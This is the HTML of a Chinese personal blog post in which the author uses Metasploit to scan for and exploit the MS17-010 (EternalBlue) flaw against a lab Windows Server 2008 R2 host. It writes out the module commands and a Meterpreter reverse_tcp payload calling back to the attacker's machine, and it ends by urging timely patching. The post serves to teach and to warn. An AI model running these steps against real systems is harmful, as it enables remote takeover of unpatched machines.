@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>ms17-010渗透测试</title>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="keywords" content="ms17-010渗透测试, Windows, 渗透,Linux, CodeShurrik" />
+    <meta name="description" content="ms17-010渗透测试, Windows, 渗透,Linux, 主机工程师每天的一项日常工作就是给系统打各种补丁，我之前一直不以为然，认为这些补丁都可有可无。最近实践了下大名鼎鼎的ms17-010永恒之蓝，让我改变了这一想法。" />
+    <meta name="theme-color" content="#2CA6CB"/>
+    <link rel="shortcut icon" type="image/x-icon" media="screen" href="http://localhost:4000/favicon.ico" />
+    <link rel="canonical" href="http://localhost:4000/2019-11-11/ms17-010%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" />
+    <link rel="alternate" type="application/rss+xml" title="CodeShurrik" href="http://localhost:4000/feed.xml"  />
+
+    <link rel="stylesheet" type="text/css" href="http://localhost:4000/static/css/bootstrap.css"/>
+    <link rel="stylesheet" href="https://cdn.bootcss.com/octicons/3.5.0/octicons.min.css" >
+    <!-- <script async defer data-website-id="bef53d4f-2117-4edd-b7a8-8754ea01f2c2" src="http://localhost:4000/static/js/umami.js"></script> -->
+    <link rel="stylesheet" type="text/css" href="http://localhost:4000/static/css/style.css" />
+    <link rel="stylesheet" type="text/css" href="http://localhost:4000/static/css/highlight.css" />
+    <link rel="stylesheet" type="text/css" href="http://localhost:4000/static/css/post.css" />
+    
+
+</head>
+
+
+<body>
+
+    <header>
+        <nav class="navbar navbar-tiffany rectangle" role="navigation">
+            <div class="container">
+                <div class="navbar-header">
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="http://localhost:4000/">CodeShurrik</a>
+                    <p class="navbar-text">
+                        <span id="typed"></span>
+                        <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.9"></script>
+                        <script>
+                            var typed = new Typed("#typed", {
+                                strings: ['welcome to','shurrik blog'],
+                                startDelay: 300,
+                                typeSpeed: 100,
+                                loop: true,
+                                backSpeed: 50,
+                                showCursor: true
+                            });
+                        </script>
+                    </p>
+                </div>
+                <div class="collapse navbar-collapse">
+                    <ul class="nav navbar-nav navbar-right">
+                        
+                        <li>
+                        <a href="http://localhost:4000/" class="word-keep"><span class="octicon octicon-book"></span></span>&nbsp;&nbsp;Blog</a>
+                        </li>
+                        
+                        
+                        
+                        <li>
+                            <a href="http://localhost:4000/category/" class="word-keep"><span class="octicon octicon-list-unordered"></span>&nbsp;&nbsp;Category</a>
+                        </li>
+                        
+                        
+                        
+                        <li>
+                            <a href="http://localhost:4000/tags/" class="word-keep"><span class="octicon octicon-tag"></span>&nbsp;&nbsp;Tag</a>
+                        </li>
+                        
+                        
+                        
+                        <li>
+                            <a href="http://localhost:4000/fm/" class="word-keep"><span class="octicon octicon-unmute"></span>&nbsp;&nbsp;FM</a>
+                        </li>
+                        
+                        
+                        
+                        
+                        <li>
+                            <a href="http://localhost:4000/monitor/" class="word-keep"><span class="octicon octicon-tools"></span>&nbsp;&nbsp;Monitor</a>
+                        </li>
+                        
+                        
+                        
+                        <li>
+                            <a href="http://localhost:4000/about/" class="word-keep"><span class="octicon octicon-terminal"></span>&nbsp;&nbsp;About</a>
+                        </li>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+
+
+<div class="main">
+    <div class="container">
+        <div class="row">
+    <div class="content col-lg-9">
+        <div class="sheet post">
+          <header>
+            <h2>ms17-010渗透测试</h2>
+            <p class="post-meta">
+                <span class="octicon octicon-clock"></span> Nov 11, 2019
+            </p>
+            <p class="post-tag">
+                <span><a href="http://localhost:4000/category/#Windows"><span class="octicon octicon-list-unordered"></span>&nbsp;Windows</a></span>
+                <span>
+                    <a class="word-keep" href="http://localhost:4000/tags/#渗透"><span class="octicon octicon-tag"></span>&nbsp;渗透</a>
+                    
+                    <a class="word-keep" href="http://localhost:4000/tags/#Linux"><span class="octicon octicon-tag"></span>&nbsp;Linux</a>
+                    
+                </span>
+            </p>
+          </header>
+          <hr class="boundary">
+          <article>
+            <p>主机工程师每天的一项日常工作就是给系统打各种补丁，我之前一直不以为然，认为这些补丁都可有可无。最近实践了下大名鼎鼎的ms17-010永恒之蓝，让我改变了这一想法。</p>
+
+<p><img src="https://user-images.githubusercontent.com/4729226/68555108-ee55d800-0466-11ea-8e6a-6d93d8481c54.png" alt="漏洞" /></p>
+
+<blockquote>
+  <p>主机：kali   192.168.106.242</p>
+
+  <p>靶机：Windows Server 2008 R2   192.168.106.240</p>
+</blockquote>
+
+<p>永恒之蓝是以前玩剩下的了，现在Metasploit里面已经集成了17-010漏洞，渗透测试更加方便与正式化，内网中用17-010去测一测会发现意外惊喜。</p>
+
+<p><img src="https://user-images.githubusercontent.com/4729226/68555461-dd0dcb00-0468-11ea-89b7-5fcc0f92abbe.png" alt="search" /></p>
+
+<p>搜索到了4个相关的模块：</p>
+
+<ol>
+  <li>auxiliary/admin/smb/ms17_010_command</li>
+  <li>auxiliary/scanner/smb/smb_ms17_010</li>
+  <li>exploit/windows/smb/ms17_010_eternalblue</li>
+  <li>exploit/windows/smb/ms17_010_psexec</li>
+</ol>
+
+<p>先使用<code class="language-plaintext highlighter-rouge">auxiliary/scanner/smb/smb_ms17_010</code>扫描可能含有ms17-010漏洞的服务器。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_ms17_010
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Module options <span class="o">(</span>auxiliary/scanner/smb/smb_ms17_010<span class="o">)</span>:
+
+   Name         Current Setting                                                 Required  Description
+   <span class="nt">----</span>         <span class="nt">---------------</span>                                                 <span class="nt">--------</span>  <span class="nt">-----------</span>
+   CHECK_ARCH   <span class="nb">true                                                            </span>no        Check <span class="k">for </span>architecture on vulnerable hosts
+   CHECK_DOPU   <span class="nb">true                                                            </span>no        Check <span class="k">for </span>DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   <span class="nb">false                                                           </span>no        Check <span class="k">for </span>named pipe on vulnerable hosts
+   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  <span class="nb">yes       </span>List of named pipes to check
+   RHOSTS                                                                       <span class="nb">yes       </span>The target address range or CIDR identifier
+   RPORT        445                                                             <span class="nb">yes       </span>The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
+   SMBDomain    <span class="nb">.</span>                                                               no        The Windows domain to use <span class="k">for </span>authentication
+   SMBPass                                                                      no        The password <span class="k">for </span>the specified username
+   SMBUser                                                                      no        The username to authenticate as
+   THREADS      1                                                               <span class="nb">yes       </span>The number of concurrent threads
+
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> <span class="o">&gt;</span> 
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/4729226/68555634-9c628180-0469-11ea-8ad9-dd0df9bda69b.png" alt="QQ截图20191111095648" /></p>
+
+<p>可以看到靶机的ms17-010漏洞被扫描出来了。</p>
+
+<p>使用<code class="language-plaintext highlighter-rouge">exploit/windows/smb/ms17_010_eternalblue</code>攻击，这里设置meterpreter的payload。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> <span class="o">&gt;</span> use exploit/windows/smb/ms17_010_eternalblue
+msf5 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 192.168.106.240
+rhosts <span class="o">=&gt;</span> 192.168.106.240
+msf5 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/x64/meterpreter/reverse_tcp
+payload <span class="o">=&gt;</span> windows/x64/meterpreter/reverse_tcp
+msf5 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 192.168.106.242
+lhost <span class="o">=&gt;</span> 192.168.106.242
+msf5 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Module options <span class="o">(</span>exploit/windows/smb/ms17_010_eternalblue<span class="o">)</span>:
+
+   Name           Current Setting  Required  Description
+   <span class="nt">----</span>           <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   RHOSTS         192.168.106.240  <span class="nb">yes       </span>The target address range or CIDR identifier
+   RPORT          445              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+   SMBDomain      <span class="nb">.</span>                no        <span class="o">(</span>Optional<span class="o">)</span> The Windows domain to use <span class="k">for </span>authentication
+   SMBPass                         no        <span class="o">(</span>Optional<span class="o">)</span> The password <span class="k">for </span>the specified username
+   SMBUser                         no        <span class="o">(</span>Optional<span class="o">)</span> The username to authenticate as
+   VERIFY_ARCH    <span class="nb">true             yes       </span>Check <span class="k">if </span>remote architecture matches exploit Target.
+   VERIFY_TARGET  <span class="nb">true             yes       </span>Check <span class="k">if </span>remote OS matches exploit Target.
+
+
+Payload options <span class="o">(</span>windows/x64/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name      Current Setting  Required  Description
+   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   EXITFUNC  thread           <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
+   LHOST     192.168.106.242  <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT     4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Windows 7 and Server 2008 R2 <span class="o">(</span>x64<span class="o">)</span> All Service Packs
+
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/4729226/68555823-75587f80-046a-11ea-86c6-ff2cb296fa2b.png" alt="攻击成功" /></p>
+
+<p>exploit成功，接下来就可以为所欲为了~~</p>
+
+<p>所以说补丁还是得勤打，特别是永恒之蓝这种级别的漏洞，毕竟各大厂商不是吃白饭的。</p>
+
+          </article>
+          <hr class="boundary">
+          <div id="post-share" class="bdsharebuttonbox">
+              <a href="#" class="bds_more" data-cmd="more"></a>
+              <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+              <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+              <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+              <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+              <a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+          </div>
+        </div>
+        <div class="pad-min"></div>
+       <!-- <div id="post-comment" class="sheet post"> -->
+        <!--PC和WAP自适应版-->
+        <!-- <div id="SOHUCS" ></div>  -->
+        <!-- <script type="text/javascript"> 
+        (function(){ 
+        var appid = 'cyt71nso6'; 
+        var conf = 'prod_d224308500d6b59d843a38fa4a3b0fd9'; 
+        var width = window.innerWidth || document.documentElement.clientWidth; 
+        if (width < 960) { 
+        window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
+
+        <div id="disqus_thread"></div> -->
+        <!-- </div> -->
+    </div>
+    <div class="content-navigation col-lg-3">
+      <div class="shadow-bottom-center" >
+        <div class="content-navigation-toc">
+            <div class="content-navigation-header">
+                <span class="octicon octicon-list-unordered"></span>&nbsp;Toc
+            </div>
+            <div class="content-navigation-list toc"></div>
+        </div>
+        <div class="content-navigation-tag">
+            <div class="content-navigation-header">
+                <span class="octicon octicon-list-unordered"></span>&nbsp;Tags
+            </div>
+            <div class="content-navigation-list">
+                <ul>
+                    
+                    <li>
+                        <a href="http://localhost:4000/tags#渗透"><span class="octicon octicon-tag"></span>&nbsp;渗透</a>
+                    </li>
+                    
+                    <li>
+                        <a href="http://localhost:4000/tags#Linux"><span class="octicon octicon-tag"></span>&nbsp;Linux</a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="content-navigation-related">
+            <div class="content-navigation-header">
+                <span class="octicon octicon-list-unordered"></span>&nbsp;Related
+            </div>
+            <div class="content-navigation-list">
+                <ul>
+                    
+
+                    
+
+                    
+                        
+                            <li>
+                                <a href="http://localhost:4000/2018-03-26/%E5%B9%B2%E6%8E%89Linux-Firefox%E7%9A%84Title-bar/">干掉Linux Firefox的Title bar</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2017-03-06/awk-sed-grep%E6%80%BB%E7%BB%93/">awk & sed & grep总结</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2016-02-16/Read-only-file-system/">Read-only file system</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2015-12-03/%E6%88%91%E5%B0%B1%E6%83%B3%E4%BF%9D%E5%AD%98%E4%B8%AA%E5%AF%86%E7%A0%81/">我就是想保存个密码</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2015-10-17/mysql%E6%97%A5%E5%BF%97%E8%BD%AC%E5%82%A8%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7/">log转储的重要性</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2015-08-16/%E5%85%B3%E4%BA%8Ecacti/">关于cacti</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2014-09-13/SDN%E7%BD%91%E7%BB%9C%E4%B9%8BMininet/">SDN网络之Mininet</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2014-08-07/%E7%BB%88%E7%AB%AF%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4/">终端后台运行命令</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2014-07-24/CentOS-5%E5%8D%87%E7%BA%A7Python%E7%89%88%E6%9C%AC-2.4-2.7/">CentOS 5升级Python版本（2.4->2.7）</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2014-06-26/Vim%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B-CoolShell/">Vim简明教程【CoolShell】</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2014-05-25/apt-get-update%E7%9A%84%E6%97%B6%E5%80%99%E9%81%87%E5%88%B0-Hash-Sum-mismatch-%E9%94%99%E8%AF%AF/">apt-get update的时候遇到“Hash Sum mismatch”错误</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2013-08-18/Linux-%E7%9A%84%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/">Linux 的启动流程</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2013-07-04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E5%A6%82%E4%BD%95%E5%90%AF%E5%8A%A8%E7%9A%84/">计算机是如何启动的？</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2013-06-01/Win7+Ubuntu12.04(EasyBCD%E7%A1%AC%E7%9B%98%E5%AE%89%E8%A3%85)/">Win7+Ubuntu12.04(EasyBCD硬盘安装)</a>
+                            </li>
+                        
+                            <li>
+                                <a href="http://localhost:4000/2013-06-01/Linux%E4%B8%8BJDK%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/">Linux下JDK的安装与配置</a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+        </div>
+      </div>
+    </div>
+</div>
+    </div>
+    
+    <div class="page-scrollTop" data-toggle="tooltip" data-placement="top" title="Top">
+        <a href="javascript:void(0);">
+            <div class="arrow"></div>
+            <div class="stick"></div>
+        </a>
+    </div>
+</div>
+
+    <footer  class="footnote footnote-tiffany">
+        <div class="container">
+                <a class="foot-item" href="mailto:shurrik.dly@gmail.com" target="_blank"><span class="octicon octicon-mail"></span></a>
+                <a class="foot-item" href="https://github.com/ixjx" target="_blank"><span class="octicon octicon-mark-github"></span></a>
+                <a class="foot-item" href="http://localhost:4000/feed.xml" target="_blank"><span class="octicon octicon-rss"></span></a>
+                <a class="foot-item" href="http://localhost:4000/link/"><span class="octicon octicon-link-external"></span></a>
+                &nbsp;
+                <a href="https://ixjx.github.io/blog"><span class="word-keep">&copy; Codeshurrik</span></a>
+                <br>
+                <span>珍爱生命，远离IE。请使用Chrome或Safari，你懂的 :)</span>
+                <br>
+                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+                <script>// <![CDATA[
+                    var now = new Date(); function createtime(){ var grt= new Date("07/28/2013 21:00:00");now.setTime(now.getTime()+250); days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} document.getElementById("timeDate").innerHTML = "已安全运行"+dnum+"天"; document.getElementById("times").innerHTML = hnum + "小时" + mnum + "分" + snum + "秒"; } setInterval("createtime()",250);
+                // ]]></script>
+        </div>
+    </footer>
+    <script type="text/javascript" src="https://cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
+    <script type="text/javascript" src="https://cdn.bootcss.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
+    <!-- <script id="MathJax-script" async src="https://cdn.bootcss.com/mathjax/3.0.5/es5/tex-mml-chtml.js"></script> -->
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">
+    <!-- The loading of KaTeX is deferred to speed up page rendering -->
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.js" integrity="sha384-Qsn9KnoKISj6dI8g7p1HBlNpVx0I8p1SvlwOldgi3IorMle61nQy4zEahWYtljaz" crossorigin="anonymous"></script>
+    <!-- To automatically render math in text elements, include the auto-render extension: -->
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
+        onload="renderMathInElement(document.body);"></script>
+    
+    <script type="text/javascript" src="http://localhost:4000/static/js/script.js"></script>
+    <script type="text/javascript" src="http://localhost:4000/static/js/post.js"></script>
+    
+
+
+</body>
+</html>
